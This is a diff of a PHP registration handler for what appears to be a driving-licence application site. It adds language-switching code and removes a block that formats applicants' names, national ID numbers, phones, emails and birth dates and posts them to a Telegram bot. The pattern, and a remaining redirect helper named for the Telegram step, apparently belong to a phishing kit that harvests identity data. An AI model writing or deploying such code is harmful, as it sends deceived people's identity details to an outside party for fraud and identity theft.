@@ -3,6 +3,11 @@
 session_start();
 header('Content-Type: text/html; charset=utf-8');
 
+require_once '../includes/lang.php';
+if (!empty($_POST['site_lang'])) {
+    set_site_lang($_POST['site_lang']);
+}
+
 // تضمين ملف init.php
 require_once '../dashboard/init.php';
 
@@ -104,57 +109,7 @@ try {
     error_log("Pusher Error: " . $e->getMessage());
 }
 
-// =====================================
-// تجهيز رسالة Telegram
-// =====================================
-$msg  = "📋 <b>طلب تسجيل جديد</b>\n\n";
-$msg .= "━━━━━━━━━━━━━━━━━━━\n\n";
-$msg .= "🆔 <b>User ID:</b> #" . $userId . "\n\n";
-
-// معلومات الطلب
-$requestTypes = [
-    '1' => 'رخصة قيادة خاصة',
-    '2' => 'رخصة قيادة عامة',
-    '3' => 'رخصة قيادة دراجة آلية',
-    '4' => 'رخصة قيادة مركبات أشغال عامة',
-    '5' => 'تصريح قيادة'
-];
-
-$requestType = $requestTypes[$_POST['request_type'] ?? ''] ?? ($_POST['request_type'] ?? '-');
-
-$msg .= "📝 <b>نوع الطلب:</b> " . $requestType . "\n";
-$msg .= "🌍 <b>الجنسية:</b> " . ($_POST['nationality'] ?? '-') . "\n\n";
-
-// البيانات الشخصية
-$msg .= "👤 <b>الاسم الكامل:</b> " . ($_POST['name'] ?? '-') . "\n";
-$msg .= "🆔 <b>رقم الهوية:</b> " . ($_POST['ssn'] ?? '-') . "\n";
-$msg .= "📱 <b>رقم الجوال:</b> " . ($_POST['phone'] ?? '-') . "\n";
-$msg .= "📧 <b>البريد الإلكتروني:</b> " . ($_POST['email'] ?? '-') . "\n";
-$msg .= "🎂 <b>تاريخ الميلاد:</b> " . ($_POST['date'] ?? '-') . "\n\n";
-
-$msg .= "━━━━━━━━━━━━━━━━━━━\n";
-$msg .= "⏰ <b>التاريخ:</b> " . date('Y-m-d H:i:s');
-
-$redirect = "../register-second.php";
-
-// =====================================
-// إرسال Telegram
-// =====================================
-file_get_contents(
-    "https://api.telegram.org/bot{$botToken}/sendMessage",
-    false,
-    stream_context_create([
-        'http' => [
-            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query([
-                'chat_id'    => $chatId,
-                'text'       => $msg,
-                'parse_mode' => 'HTML'
-            ])
-        ]
-    ])
-);
+$redirect = lang_redirect_after_tele('register-second.php');
 
 // =====================================
 // حفظ البيانات في localStorage والتحويل
